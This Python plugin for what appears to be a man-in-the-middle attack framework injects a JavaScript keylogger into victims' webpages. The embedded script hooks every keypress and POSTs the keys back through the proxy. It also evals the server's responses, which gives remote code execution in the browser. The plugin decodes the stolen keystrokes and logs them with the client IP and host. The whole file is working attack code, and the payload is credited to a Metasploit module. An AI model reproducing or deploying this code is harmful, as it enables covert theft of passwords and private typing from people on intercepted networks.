from plugins.plugin import Plugin
from plugins.Inject import Inject
import logging

class jskeylogger(Inject, Plugin):
    name = "Javascript Keylogger"
    optname = "jskeylogger"
    desc = "Injects a javascript keylogger into clients webpages"
    implements = ["handleResponse","handleHeader","connectionMade", "sendPostData"]
    has_opts = False

    def initialize(self,options):
        Inject.initialize(self, options)
        self.html_payload = self.msf_keylogger()
        print "[*] Javascript Keylogger plugin online"

    def sendPostData(self, request):
        #Handle the jskeylogger plugin output
        if 'keylog' in request.uri:
            keys = request.postData.split(",")
            del keys[0]; del(keys[len(keys)-1])

            nice = ''
            for n in keys:
                if n == '9':
                    nice += "<TAB>"
                elif n == '8':
                    nice = nice.replace(nice[-1:], "")
                elif n == '13':
                    nice = ''
                else:
                    try:
                        nice += n.decode('hex')
                    except:
                        print "ERROR: unknown char " + n

            logging.warning("%s [%s] Keys: %s" % (request.client.getClientIP(), request.headers['host'], nice))

    def msf_keylogger(self):
        #Stolen from the Metasploit module http_javascript_keylogger

        payload = """<script type="text/javascript">
window.onload = function mainfunc(){
var2 = ",";

function make_xhr(){
    var xhr;
            try {
                xhr = new XMLHttpRequest();
            } catch(e) {
                try {
                    xhr = new ActiveXObject("Microsoft.XMLHTTP");
                } catch(e) {
                    xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                }
            }
            if(!xhr) {
                throw "failed to create XMLHttpRequest";
            }
            return xhr;
        }
        
        xhr = make_xhr();
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
                eval(xhr.responseText);
            }
        }

if (window.addEventListener) {
document.addEventListener('keypress', function2, true);
document.addEventListener('keydown', function1, true);
} else if (window.attachEvent) {
document.attachEvent('onkeypress', function2);
document.attachEvent('onkeydown', function1);
} else {
document.onkeypress = function2;
document.onkeydown = function1;
}

}
function function2(e){
var3 = (window.event) ? window.event.keyCode : e.which;
var3 = var3.toString(16);
if (var3 != "d"){
function3(var3);
}
}
function function1(e){
var3 = (window.event) ? window.event.keyCode : e.which;
if (var3 == 9 || var3 == 8 || var3 == 13){
function3(var3);
}
}

function function3(var3){
var2 = var2 + var3 + ",";

xhr.open("POST", "keylog", true);
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xhr.send(var2);

if (var3 == 13 || var2.length > 3000)
    var2 = ",";
}
</script>"""

        return payload